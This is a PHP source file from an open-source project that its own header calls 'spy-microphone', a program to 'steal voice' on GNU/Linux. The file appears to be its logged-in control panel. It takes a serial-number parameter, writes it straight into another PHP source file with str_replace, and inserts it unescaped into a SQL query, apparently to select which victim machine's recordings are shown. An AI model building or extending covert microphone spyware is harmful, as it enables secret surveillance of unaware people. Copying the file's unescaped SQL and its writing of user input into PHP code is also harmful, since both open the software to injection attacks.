<?php

#
# Copyright (c) 2018 Barchampas Gerasimos <makindosx@gmail.com>
# spy-microphone is a program for steal voice in gnu/linux OS.
#
# spy-microphone is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as
# published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version.
#
#
# spy-microphone is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License, version 3,
# along with this program.  If not, see <http://www.gnu.org/licenses/>
#

session_start();

 if (!isset($_SESSION['login']))
    {
      header("Location: index.php");
      }
  
     else
      {

require_once('__ROOT__/connect.php');

            if (class_exists('DATABASE_CONNECT'))
            {
 
             $obj_conn  = new DATABASE_CONNECT;
            
             $host = $obj_conn->connect[0];
             $user = $obj_conn->connect[1];
             $pass = $obj_conn->connect[2];
             $db   = $obj_conn->connect[3];
 
            $conn = new mysqli($host,$user,$pass,$db);
 
             if ($conn->connect_error)
                   {
                    die ("Cannot connect " .$conn->connect_error);
                    }

               else
                {


        $sql = "select str_line from str_lines order by str_line asc";
        $result = $conn->query($sql);
                 

         while($row = $result->fetch_assoc())  
          {
           $line = $row['str_line'];
          


if(isset($_GET['serial_number']))
   {


    $hard_disk_id_serial_number = $_GET['serial_number'];

   
    if(!$hard_disk_id_serial_number) 
     {
        die('The hard_disk_id_serial_number is invalid!');
      }
    else 
      {


 
  $path_to_file = 'paginationDAOClass.php';
  $file_contents = file_get_contents($path_to_file);
  $file_contents = str_replace("hard_disk_id_serial_number = '$line'",
                             "hard_disk_id_serial_number = '$hard_disk_id_serial_number'",$file_contents);
  file_put_contents($path_to_file,$file_contents);


  } // end of else get hard_disk_id_serial_number

 } // end of if isset  

  
  } //end of while  


    $sql2 = "insert into str_lines (str_line) values('$hard_disk_id_serial_number')";
    $result2 = $conn->query($sql2);



      echo ("<script>location.href='pagination.php'</script>");

 
  }  // end of else connect

 
  } // end of connect class exists


  } // end else session login

?>
